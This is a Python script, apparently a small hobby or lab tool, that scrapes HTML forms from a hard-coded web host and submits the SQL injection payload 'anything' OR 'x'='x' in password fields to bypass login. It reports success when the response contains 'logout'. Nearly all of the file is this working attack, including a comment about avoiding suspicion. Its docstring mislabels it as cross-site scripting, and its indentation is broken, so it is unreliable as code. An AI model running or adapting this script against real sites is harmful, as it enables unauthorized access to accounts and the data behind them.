import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from json import dumps

sqlStringt = 'anything\' OR \'x\'=\'x'
url = 'http://apache1.willilazarov.cz/'


def get_forms(target_url):
    """
    Function requests all website HTML forms
    :param target_url: Requested URL
    :return: Returns all forms from HTML content
    """
    # Extract HTML source code of target website
    soup = BeautifulSoup(requests.get(target_url).content, "html.parser")
    # Find all "form" elements and return result
    return soup.find_all("form")


def get_form_attributes(form):
    """
    Function extracts all attributes of HTML form
    :param form: HTML form
    :return: All attributes and values of HTML form
    """
    # Define form attributes array
    form_attributes = {}
    # Get the form action attribute
    action = form.attrs.get("action")
    # Get the form method attribute
    method = form.attrs.get("method")
    # Define form input attributes and values list
    form_inputs = []
    # Iterate over all form elements (input, button, textarea) and add each attribute to list
    for form_input in form.find_all(["input", "button"]):
        form_input_type = form_input.attrs.get("type")
        form_input_name = form_input.attrs.get("name")
        form_inputs.append({"type": form_input_type, "name": form_input_name})
    # Add all attributes and values to array
    form_attributes["action"] = action
    form_attributes["method"] = method
    form_attributes["inputs"] = form_inputs
    return form_attributes


def submit_form(sqlString, form_attributes, target_url):
    """
    Function prepares form data and submits form
    :type sqlString: reference
    :param sqlString:
    :param form_attributes: Form input attributes with values
    :param target_url: Requested URL
    :return: HTTP Response after form submission
    """
    # Construct form submission URL
    submit_url = urljoin(target_url, form_attributes["action"])
    # Get the form inputs
    form_inputs = form_attributes["inputs"]
    # Define form data array
    form_data = {}
    # Iterate over all form elements and add them values
    for form_input in form_inputs:
        if form_input["type"] == "password" or form_input["type"] == "submit":
            print("jde se vkladat, juchu")
            # If input name attribute value is contained one of the name variants
            if form_input["type"] == "password":
                print("spravny typ")
                # Prepare username to decrease suspicion
                form_input["value"] = 'anything\' OR \'x\'=\'x'
        # Sends a POST request if method is post and return response
        form_input_name = form_input.get("name")
        form_input_value = form_input.get("value")
        if form_input_name and form_input_value:
            # Add values to the data of form submission
            form_data[form_input_name] = form_input_value
     if form_attributes["method"] == "post":
            print('returnime')
            print(requests.get(submit_url))
            return requests.post(submit_url, data=form_data)
        # Sends a GET request if method is get and return response
        else:
            return requests.get(submit_url, params=form_data)

def run_sqli(target_url, insertSqlString):
    """
    Function performs Cross-Site Scripting attack
    :param insertSqlString:
    :param target_url: Target URL
    :return: Attack success
    """
    forms = get_forms(target_url)
    # Iterate over all forms
    for form in forms:
        # Get form attributes
        form_attributes = get_form_attributes(form)
        # Submit form and save HTTP response
        content = submit_form(insertSqlString, form_attributes, target_url).content.decode()
       # print(content)
        if "logout" in content:
            is_success = True
        else:
            is_success = False
        if is_success:
            print(f"SQLI was successful")
        else:
            print(f"SQLI was unsuccessful")



if __name__ == "__main__":
    url = "http://apache1.willilazarov.cz/"
    run_sqli(url, 'anything\' OR \'x\'=\'x')